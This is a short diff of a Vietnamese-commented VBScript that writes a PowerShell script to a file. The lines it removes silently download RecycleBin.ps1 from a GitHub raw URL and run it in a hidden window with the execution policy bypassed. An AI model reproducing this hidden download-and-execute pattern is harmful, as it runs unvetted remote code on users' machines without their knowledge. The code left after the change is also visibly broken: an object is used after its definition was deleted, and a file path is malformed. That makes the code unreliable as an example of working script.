@@ -1,11 +1,5 @@
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/RecycleBin.ps1 -OutFile C:\RecycleBin.ps1", 0, True
-objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\RecycleBin.ps1", 0, True
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-
 ' Đường dẫn tới file PowerShell script
-strPSFile = objFSO.GetSpecialFolder(2) & "\temp_script.ps1"
+strPSFile = objFSO.GetSpecialFolder(2) & "C:\RecycleBin.ps1"
 
 ' Tạo nội dung file PowerShell script
 Set objFile = objFSO.CreateTextFile(strPSFile, True)
